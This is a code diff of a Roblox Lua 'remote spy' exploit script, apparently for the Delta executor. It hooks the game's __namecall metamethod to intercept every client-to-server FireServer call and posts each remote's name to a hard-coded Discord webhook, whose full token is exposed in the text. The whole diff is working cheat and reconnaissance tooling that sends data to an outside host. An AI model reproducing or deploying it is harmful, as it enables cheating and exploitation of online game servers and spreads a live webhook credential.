@@ -1,51 +1,59 @@
-task.wait(1)
+local webhook = "https://discord.com/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
 
-local WebhookURL = "https://hooks.hyra.io/api/webhooks/1489564311423815720/95RTxCNmEopgkqiRY1n_jH5hxMFuNqCS5OYxppId3UE_QxdJWgXuMPbVoubeVDhp-AT6"
 
--- Verify environment functions exist
-local gmt = getrawmetatable or getmetatable
-local sro = setreadonly or make_writeable
-local req = request or http_request or (http and http.request)
 
-if not gmt or not sro then
-    print("Delta Error: Metatable functions not supported in this version.")
-    return
-end
+local r = request or http_request or (http and http.request)
 
-local mt = gmt(game)
-local oldNamecall = mt.__namecall
+local m = getrawmetatable(game)
 
-sro(mt, false)
+local o = m.__namecall
 
-mt.__namecall = newcclosure(function(self, ...)
+setreadonly(m, false)
+
+
+
+m.__namecall = newcclosure(function(self, ...)
+
     local method = getnamecallmethod()
-    local args = {...}
-    
-    -- Filter: Only Client-to-Server and not internal calls
-    if method == "FireServer" and not checkcaller() then
-        local name = self.Name
+
+    if method == "FireServer" then 
+
+        print("FOUND REMOTE: " .. self.Name) -- This prints in Delta console
+
         
+
         task.spawn(function()
-            if req then
-                local data = {
-                    Url = WebhookURL,
+
+            if r then
+
+                local res = r({
+
+                    Url = webhook,
+
                     Method = "POST",
+
                     Headers = {["Content-Type"] = "application/json"},
+
                     Body = game:GetService("HttpService"):JSONEncode({
-                        embeds = {{
-                            title = "📤 Outgoing Remote",
-                            description = "Remote Name: `" .. name .. "`",
-                            color = 0x00FF00
-                        }}
+
+                        content = "Captured: " .. self.Name
+
                     })
-                }
-                req(data)
+
+                })
+
+                print("Webhook Status: " .. tostring(res.StatusCode))
+
             end
+
         end)
+
     end
-    
-    return oldNamecall(self, ...)
+
+    return o(self, ...)
+
 end)
 
-sro(mt, true)
-print("Spy Active - Monitoring Outgoing Remotes")
+setreadonly(m, true)
+
+print("Spy is running! Watch the console.")
